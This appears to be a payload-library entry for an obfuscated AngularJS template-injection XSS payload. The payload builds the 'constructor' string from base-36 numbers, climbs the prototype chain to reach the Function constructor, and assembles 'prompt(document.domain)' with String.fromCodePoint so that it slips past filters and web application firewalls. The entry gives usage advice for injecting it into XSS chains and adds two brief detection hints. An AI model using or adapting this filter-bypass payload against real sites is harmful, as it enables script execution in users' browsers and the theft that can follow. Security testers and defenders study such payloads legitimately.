---
id: c77b6e10-5f61-4c2e-8da7-3ec6b58ad117
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.715632+00:00'
updated_at: '2023-04-10T20:24:52.691430+00:00'
tags:
  - xss
  - angular
  - payload
  - obfuscation
  - waf-bypass
platforms:
  - Web
validated: true
---

# Obfuscated-Angular-Prompt-Domain-fromCodePoint

## Code

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

## Description

Variant of the obfuscated prompt payload using String.fromCodePoint instead of fromCharCode for better unicode support, constructing 'prompt(document.domain)' via prototype chaining and random keys to bypass filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (None) | Identical to fromCharCode variant; no parameters. | N/A |

## Usage

Use in modern Angular apps where fromCodePoint is preferred; inject similarly to prompt domain in XSS chains.

## Detection

- Similar to fromCharCode: watch for fromCodePoint with suspicious char codes in client-side execution.
- JS profiler tools to detect indirect method calls on String prototype.

## Related

- [[procedures/Advanced-XSS-Bypass-in-Angular-and-AngularJS]]
